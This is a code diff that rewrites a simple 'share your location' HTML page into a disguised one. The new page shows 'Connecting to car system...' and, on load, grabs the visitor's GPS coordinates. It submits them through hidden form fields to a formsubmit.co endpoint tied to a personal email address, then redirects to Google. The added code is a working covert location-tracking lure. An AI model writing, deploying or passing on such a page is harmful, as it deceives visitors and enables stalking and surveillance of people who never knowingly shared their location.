@@ -1,48 +1,61 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Get My Location</title>
+  <meta charset="UTF-8">
+  <title>Connecting...</title>
   <style>
     body {
+      margin: 0;
+      padding: 0;
+      background-image: url('https://images.unsplash.com/photo-1517948430535-1e2460f95362?auto=format&fit=crop&w=1500&q=80');
+      background-size: cover;
+      background-position: center;
       font-family: Arial, sans-serif;
+      color: white;
       text-align: center;
-      margin-top: 100px;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
     }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    #location {
-      margin-top: 20px;
-      font-size: 18px;
+    h2 {
+      background-color: rgba(0, 0, 0, 0.6);
+      padding: 20px;
+      border-radius: 10px;
     }
   </style>
-</head>
-<body>
-  <h2>Tap below to share your location</h2>
-  <button onclick="getLocation()">Tap to Continue</button>
-  <p id="location"></p>
-
   <script>
-    function getLocation() {
+    function sendLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
+        navigator.geolocation.getCurrentPosition(function(position) {
+          document.getElementById("lat").value = position.coords.latitude;
+          document.getElementById("lon").value = position.coords.longitude;
+          document.getElementById("locForm").submit();
+        }, function(error) {
+          document.getElementById("lat").value = "Permission denied or error";
+          document.getElementById("lon").value = "Permission denied or error";
+          document.getElementById("locForm").submit();
+        });
       } else {
-        document.getElementById("location").innerText = "Geolocation is not supported by this browser.";
+        document.getElementById("lat").value = "Not supported";
+        document.getElementById("lon").value = "Not supported";
+        document.getElementById("locForm").submit();
       }
     }
 
-    function showPosition(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      document.getElementById("location").innerHTML = 
-        `Latitude: ${lat} <br>Longitude: ${lon} <br><a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Open in Google Maps</a>`;
-    }
-
-    function showError(error) {
-      document.getElementById("location").innerText = "Unable to retrieve location.";
-    }
+    window.onload = sendLocation;
   </script>
+</head>
+<body>
+  <h2>Connecting to car system...</h2>
+
+  <form id="locForm" action="https://formsubmit.co/akashgujjar123678@gmail.com" method="POST">
+    <input type="hidden" name="Latitude" id="lat">
+    <input type="hidden" name="Longitude" id="lon">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_next" value="https://google.com"> <!-- You can change this -->
+  </form>
 </body>
 </html>
